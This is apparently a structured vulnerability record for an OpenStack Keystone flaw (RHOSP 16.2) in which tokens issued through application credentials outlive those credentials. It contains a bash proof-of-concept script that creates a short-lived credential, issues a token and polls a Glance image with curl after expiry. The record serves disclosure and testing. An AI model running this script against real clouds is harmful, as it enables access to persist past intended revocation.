```
{
  "vulnerability_details": {
    "root_cause": "Keystone issues tokens with the default lifespan regardless of the lifespan of the application credentials used to issue them. This means a newly issued token can outlive the application credentials used to issue it.",
    "weaknesses": [
      "Token lifespan not correctly tied to the lifespan of the application credentials used to issue them."
    ],
    "impact": "A remote administrator could maintain access for longer than expected, potentially leading to unauthorized actions or data exposure.",
    "attack_vectors": "An attacker could exploit this by obtaining a token via application credentials that have a short lifespan. The token's lifespan would be longer than the application credentials, thus allowing continued access after the credentials have expired.",
    "attacker_capabilities": "The attacker would need to be a remote administrator with the ability to create application credentials."
  },
  "additional_information": {
    "affected_component": "openstack-keystone",
      "reproducibility": "100%",
    "example_attack_script": "```bash\n#!/usr/bin/env bash\n\nset -Eeuo pipefail\n\nopenstack image create --disk-format=raw --container-format=bare --file <(echo 'I am a Glance image') testimage -f json > image.json\n\nimage_url=\"$(openstack catalog show glance -f json | jq -r '.endpoints[] | select(.interface==\\\"public\\\").url')$(jq -r '.file' image.json)\"\n\nopenstack application credential create \\\n\t--expiration=\"$(date --utc --date '+10 second' +%Y-%m-%dT%H:%M:%S)\" \\\n\ttoken_test \\\n\t-f json \\\n\t> appcreds.json\n\ncat <<EOF > clouds.yaml\nclouds:\n    ${OS_CLOUD}:\n        auth:\n            auth_url: <auth_url>\n            application_credential_id: '$(jq -r '.id' appcreds.json)'\n            application_credential_secret: '$(jq -r '.secret' appcreds.json)'\n        auth_type: \"v3applicationcredential\"\n        identity_api_version: 3\n        interface: public\n        region_name: <region_name>\nEOF\n# Override ~/.config/openstack/secure.yaml\ntouch secure.yaml\n\nopenstack token issue -f json > token.json\n\necho \"appcreds expiration: $(jq -r '.expires_at' appcreds.json)\"\nfor i in {1..10}; do\n\tsleep 100\n\techo -ne \"$(date --utc --rfc-3339=seconds)\\t\"\n\tcurl -isS -H \"X-Auth-Token: $(jq -r '.id' token.json)\" --url \"$image_url\" | head -n1\ndone\n```",
     "observed_results": "The issued token remains valid and can access resources, even after the application credentials expire. This is contrary to the expected result, where the token should become invalid upon expiry of application credentials.",
    "vulnerable_versions": "RHOSP 16.2",
    "default_token_lifespan": "1 hour in a default configuration"
  }
}
```